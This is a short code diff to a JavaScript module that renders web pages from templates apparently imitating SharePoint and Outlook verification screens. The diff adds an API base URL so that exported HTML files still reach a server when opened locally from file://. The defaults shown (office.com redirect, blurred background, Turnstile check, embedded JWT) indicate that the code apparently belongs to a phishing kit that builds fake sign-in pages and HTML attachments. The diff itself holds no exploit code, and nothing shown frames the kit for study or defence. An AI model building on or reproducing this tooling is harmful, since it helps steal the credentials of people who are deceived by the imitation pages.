@@ -138,8 +138,17 @@ function buildWindowVars(link, user, settings, options = {}) {
   const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
   const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
 
+  // For exported files, set API base URL so it works when opened from file:// protocol
+  let apiBase = '';
+  if (options.apiBaseUrl) {
+    apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
+  } else if (config.APP_URL) {
+    apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
+  }
+
   return `<script>
     window.VG_JWT="${jt}";
+    window.__API_BASE="${apiBase}";
     window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
     window.__AUTH_MODE="${authMode}";
     window.__BACKGROUND_BLUR_URL="${bgUrl}";
@@ -166,6 +175,11 @@ async function renderPageHtml(link, user, options = {}) {
   const templateType = link.template_type || 'sharepoint3';
   const designName = link.verification_design || 'outlook';
   const settings = await loadAdminSettings();
+
+  // Pass apiBaseUrl to buildWindowVars for exported files
+  if (options.apiBaseUrl) {
+    options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
+  }
 
   let html = loadTemplateHTML(templateType);
   const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
